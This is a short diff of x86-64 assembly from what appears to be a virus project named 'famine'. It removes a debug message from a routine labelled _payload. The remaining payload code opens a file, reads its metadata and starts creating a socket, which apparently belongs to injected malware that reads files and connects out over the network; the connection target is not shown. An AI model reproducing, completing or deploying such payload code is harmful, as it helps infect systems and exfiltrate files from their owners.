@@ -38,13 +38,6 @@ endstruc
 _payload:
 	pushx rax, rdi, rsi, rdx, r10
 
-	; write a message
-	mov rax, 1			; SYS_write
-	mov rdi, 1			; file descriptor (stdout)
-	lea rsi, [rel .msg]	; pointer to message
-	mov rdx, 7			; length of message
-	syscall
-
 	; Open the file
 	mov rax, 2					; SYS_open
 	lea rdi, [rel FILEPATH]		; filename
@@ -68,10 +61,6 @@ _payload:
     lea rsi, [rel STATBUFFER]   ; message de succès
     mov rdx, 144     ; longueur du message
     syscall
-
-	jmp .connect
-
-.msg	db "famine", 0x0a, 0
 
 .connect:
 	; Create the socket
